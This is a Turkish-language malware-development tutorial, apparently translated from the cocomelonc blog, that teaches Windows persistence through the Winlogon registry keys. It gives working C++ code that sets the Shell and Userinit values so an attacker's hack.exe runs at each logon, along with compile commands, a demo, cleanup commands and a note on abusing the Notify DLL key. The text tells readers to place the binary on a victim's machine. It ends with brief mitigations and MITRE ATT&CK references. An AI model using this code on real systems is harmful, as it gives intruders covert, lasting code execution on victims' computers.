\newpage
\subsection{73. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 7. Winlogon. Basit C++ örneği.}

![pers](./images/58/2022-06-12_15-01.png){width="80%"}    

Bugün, kendi araştırmalarımın sonucu olarak keşfettiğim başka bir kalıcılık tekniği olan Winlogon kayıt defteri anahtarları hakkında yazacağım.     

### winlogon

Winlogon işlemi, kullanıcı giriş ve çıkışlarından, sistemin başlatılıp kapatılmasından ve ekranın kilitlenmesinden sorumludur. Kötü amaçlı yazılım yazarları, Winlogon işleminin kullandığı kayıt defteri girdilerini değiştirerek kalıcılık sağlayabilir.   

Bu kalıcılık tekniğini uygulamak için aşağıdaki kayıt defteri anahtarlarının değiştirilmesi gerekir:    

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`     
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`     

Ancak, bu tekniği uygulamak için yerel yönetici ayrıcalıkları gereklidir.

### pratik örnek

Öncelikle, kötü amaçlı uygulamamızı oluşturalım (`hack.cpp`):    

```cpp
/*
meow-meow messagebox
author: @cocomelonc
*/
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE 
hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Gördüğünüz gibi, her zamanki gibi sadece bir `meow-meow` mesajı açılır penceresi görünecek.    

Hadi derleyelim:   

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/58/2022-06-12_14-17.png){width="80%"}    

Oluşturulan `hack.exe` dosyası, hedef kurbanın makinesine yerleştirilmelidir.  

`Shell` kayıt defteri anahtarına yapılan değişiklikler, Windows oturumu açıldığında `explorer.exe` ve `hack.exe` dosyalarının çalıştırılmasına neden olacaktır.   

Bu işlem aşağıdaki komut dosyası kullanılarak hemen gerçekleştirilebilir:   

```cpp
/*
pers.cpp
windows persistence via winlogon keys
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/12/malware-pers-7.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // shell
  // const char* sh = "explorer.exe,
  // Z:\\2022-06-12-malware-pers-7\\hack.exe";
  const char* sh = "explorer.exe,hack.exe";

  // startup
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
  (LPCSTR)
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 
  0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key

    // reg add 
    // "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
    // NT\CurrentVersion\Winlogon" 
    // /v "Shell" /t REG_SZ /d "explorer.exe,..." /f
    RegSetValueEx(hkey, (LPCSTR)"Shell", 0, REG_SZ, 
    (unsigned char*)sh, strlen(sh));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Benzer şekilde `Userinit` için de aynı durum geçerlidir.    

Bu kayıt defteri anahtarı kötü amaçlı bir uygulama içerdiğinde, Windows oturumu açıldığında `userinit.exe` ve `hack.exe` dosyaları çalıştırılacaktır:   

```cpp
/*
pers.cpp
windows persistence via winlogon keys
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/12/malware-pers-7.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // userinit
  const char* ui = "C:\\Windows\\System32\\userinit.exe,
  Z:\\2022-06-12-malware-pers-7\\hack.exe";

  // startup
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
  (LPCSTR)
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 
  0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key

    // reg add 
    // "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
    // NT\CurrentVersion\Winlogon" 
    // /v "Shell" /t REG_SZ /d "explorer.exe,..." /f
    RegSetValueEx(hkey, (LPCSTR)"Userinit", 0, 
    REG_SZ, (unsigned char*)ui, strlen(ui));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Bu nedenle, kalıcılıktan sorumlu olan programı derleyelim:

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/58/2022-06-12_14-18.png){width="80%"}    

### demo

Ve her şeyi çalışırken görelim. Öncelikle, kayıt defteri anahtarlarını kontrol edin:   

```powershell
req query \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" \
/s
```

![pers](./images/58/2022-06-12_14-23.png){width="80%"}    

Kötü amaçlı uygulamayı `C:\Windows\System32\` dizinine kopyalayıp ve çalıştıralım:

```powershell
.\pers.exe
```

![pers](./images/58/2022-06-12_14-41.png){width="80%"}    

Ardından oturumu kapatıp tekrar açın:

![pers](./images/58/2022-06-12_14-26_1.png){width="80%"}    

Kötü amaçlı programımızın mantığına göre, "meow-meow" mesaj kutusu açıldı:   

![pers](./images/58/2022-06-12_14-42.png){width="80%"}    

![pers](./images/58/2022-06-12_14-45.png){width="80%"}    

Process Hacker 2 üzerinden işlem özelliklerini kontrol edelim:    

![pers](./images/58/2022-06-12_14-43.png){width="80%"}    

Sonra temizleyelim:

```powershell
reg add \
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows 
NT\CurrentVersion\Winlogon" \ 
/v "Shell" /t REG_SZ /d "explorer.exe" /f
```

![pers](./images/58/2022-06-12_14-47.png){width="80%"}    

Peki ya başka bir anahtar olan `Userinit.exe`? Hadi kontrol edelim. Çalıştırın:

```powershell
.\pers.exe
```

![pers](./images/58/2022-06-12_14-52.png){width="80%"}    

Oturumu aç ve kapat:

![pers](./images/58/2022-06-12_14-26_1.png){width="80%"}    

![pers](./images/58/2022-06-12_14-55.png){width="80%"}    

Daha doğru bir deney yapmak için, Process Hacker 2'de `hack.exe` dosyasının özelliklerini kontrol edin:    

![pers](./images/58/2022-06-12_14-55.png){width="80%"}    

Gördüğünüz gibi, ana işlem `winlogon.exe` olarak görünüyor.   

Temizleyelim:

```powershell
reg add \
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows 
NT\CurrentVersion\Winlogon" \
/v "Userinit" /t REG_SZ /d \
"C:\Windows\System32\userinit.exe" /f
```

![pers](./images/58/2022-06-12_14-59.png){width="80%"}    

Gördüğünüz gibi, her iki durumda da kötü amaçlı yazılım Windows kimlik doğrulaması sırasında çalıştırılacaktır.    

Ancak, burada ilginç bir nokta var. Örneğin, eğer aşağıdaki mantıkla kayıt defteri anahtarını güncellersek:    

```cpp
/*
pers.cpp
windows persistence via winlogon keys
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/06/12/malware-pers-7.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // shell
  const char* sh = "explorer.exe,
  Z:\\2022-06-12-malware-pers-7\\hack.exe";

  // startup
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
  (LPCSTR)
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 
  0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key

    // reg add 
    // "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows
    // NT\CurrentVersion\Winlogon" /v 
    // "Shell" /t REG_SZ /d "explorer.exe,..." /f
    RegSetValueEx(hkey, (LPCSTR)"Shell", 0, 
    REG_SZ, (unsigned char*)sh, strlen(sh));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Yani, kötü amaçlı yazılımımız `C:\Windows\System32\hack.exe` yerine `Z:...\hack.exe` yolunda bulunuyor.   

Çalıştırın:  

```powershell
.\pers.exe 
req query "HKLM\Software\Microsoft\Windows 
NT\CurrentVersion\Winlogon" /s
```

![pers](./images/58/2022-06-12_14-26.png){width="80%"}    

Ve tekrar oturum açın:

![pers](./images/58/2022-06-12_14-26_1.png){width="80%"}    

![pers](./images/58/2022-06-12_14-27.png){width="80%"}    

`hack.exe`'nin özelliklerini kontrol etme:

![pers](./images/58/2022-06-12_14-30.png){width="80%"}    

Gördüğünüz gibi, üst süreç Mevcut Olmayan Süreç (`Non-existent process`) olarak görünüyor. Parent, Mevcut Olmayan Süreç olarak görünecektir çünkü `userinit.exe` kendini sonlandırır.     

Bir not daha var. Ayrıca, `Notify` kayıt defteri anahtarı genellikle eski işletim sistemlerinde (`Windows 7`’den önce) bulunur ve Winlogon olaylarını yöneten bir bildirim paketi DLL dosyasına işaret eder. Eğer bu kayıt defteri anahtarı altındaki DLL girişlerini başka bir DLL ile değiştirirseniz, Windows oturum açma sırasında onu çalıştıracaktır.    

Peki, önlemler ne olabilir? Kullanıcı hesap ayrıcalıklarını sınırlandırarak yalnızca yetkili yöneticilerin Winlogon yardımcı programını değiştirmesine izin verin. [Sysinternals Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) gibi araçlar, sistem değişikliklerini tespit etmek için kullanılabilir. Bu araç, mevcut Winlogon yardımcı değerlerinin listesini çıkararak kalıcılık girişimlerini belirleyebilir.   

Bu kalıcılık tekniği, [Turla](https://attack.mitre.org/groups/G0010/) grubu ve[Gazer](https://attack.mitre.org/software/S0168/), [Bazaar](https://attack.mitre.org/software/S0534/) gibi yazılımlar tarafından vahşi doğada (in the wild) kullanılmıştır.    

[MITRE ATT&CK - Boot or Logon Autostart Execution: Winlogon Helper DLL](https://attack.mitre.org/techniques/T1547/004/)    
[Turla](https://attack.mitre.org/groups/G0010/)    
[Gazer backdoor](https://attack.mitre.org/software/S0168/)    
[Bazaar](https://attack.mitre.org/software/S0534/)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2022-06-12-malware-pers-7)    
